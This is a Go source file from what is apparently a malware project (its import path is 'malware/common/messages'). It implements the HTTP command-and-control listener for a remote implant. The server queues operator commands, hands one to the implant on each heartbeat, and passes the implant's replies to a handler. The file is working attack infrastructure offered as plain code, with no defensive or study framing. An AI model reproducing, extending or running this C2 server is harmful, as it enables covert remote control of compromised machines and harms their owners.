package http_network

import (
	"fmt"
	"io/ioutil"
	"log"
	"malware/common/messages"
	"net/http"
	"time"

	"github.com/golang/protobuf/jsonpb"
)

type network struct {
	queue       chan *messages.CheckCmdReply // Queue of commands to send to implant
	handleReply func(*messages.CheckCmdRequest)
}

var marshal = &jsonpb.Marshaler{}

func InitNetwork(port int, handleReply func(*messages.CheckCmdRequest), queue chan *messages.CheckCmdReply) {
	network := &network{queue, handleReply}
	s := &http.Server{
		Addr:           fmt.Sprintf(":%d", port),
		Handler:        network,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}

	log.Fatal(s.ListenAndServe())
}

func (network *network) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// try to decode the body
	body, err := ioutil.ReadAll(r.Body)

	if err != nil {
		log.Println("Received bad message")
		return
	}

	req := &messages.CheckCmdRequest{}

	jsonpb.UnmarshalString(string(body), req)

	if req.GetHeartbeat() > 0 {
		select {
		case msg, ok := <-network.queue:
			if ok {
				bytes, _ := marshal.MarshalToString(msg) //msg.XXX_Marshal([]byte{}, true)

				w.Write([]byte(bytes))
				return
			} else {
				panic("network Message Queue closed")
			}
		default:
			// No message in queue
		}
	} else {
		network.handleReply(req)
	}

	bytes, _ := marshal.MarshalToString(messages.C2_heartbeat(time.Now().Unix())) //.XXX_Marshal([]byte{}, true)
	w.Write([]byte(bytes))
}

func KillNetwork() {

}
